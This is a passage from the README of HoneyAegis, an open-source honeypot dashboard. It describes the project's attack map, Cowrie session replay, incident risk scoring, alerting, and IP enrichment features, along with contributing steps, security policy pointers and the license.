### Animated Attack Map
- **Leaflet** map with dark CARTO tiles
- **GeoIP enrichment** — IPs resolved to country, city, lat/lon via MaxMind GeoLite2 or ip-api.com fallback
- **Circle markers** — size scaled by session count, clickable popups with details

### Session Capture & Replay
- **Full Cowrie tty recording** — SSH/Telnet keystrokes captured
- **Asciinema-style replay** — play back attacker sessions in the browser terminal
- **Command history** — every command captured and indexed
- **Video export** — download session as MP4 or GIF (ffmpeg-powered)

### Incidents List
- **Sortable, filterable table** — protocol, source IP, location, duration, commands
- **Risk scoring** — automatic Low/Medium/High/Critical based on auth success, commands, duration
- **Pagination** — handle thousands of sessions efficiently

### Alerting
- **Apprise integration** — email, Slack, Discord, ntfy, Gotify, Teams, SMS (Twilio)
- **Celery-powered** — async alert delivery on new sessions and malware captures
- **Configurable** — per-channel alert thresholds via `.env`

### Enrichment
- **GeoIP** — MaxMind GeoLite2 local DB or free ip-api.com fallback
- **AbuseIPDB** — optional reputation scoring (requires free API key)
- **Cached** — results stored in PostgreSQL to minimize API calls

## Contributing

We welcome contributions! Please see [CONTRIBUTING.md](docs/CONTRIBUTING.md) for guidelines.

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## Security

HoneyAegis is designed to be deployed as a honeypot — it intentionally exposes services to attract attackers. **Always deploy on isolated networks and never on production infrastructure.**

See [SECURITY.md](SECURITY.md) for our security policy, architecture details, and deployment checklist.

To report security vulnerabilities, please see [SECURITY.md](SECURITY.md) or open a private security advisory on GitHub.

## Project Rules

See [CLAUDE.md](CLAUDE.md) for development rules, conventions, and agent instructions.

## License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  Built with purpose. Open source forever.
</p>
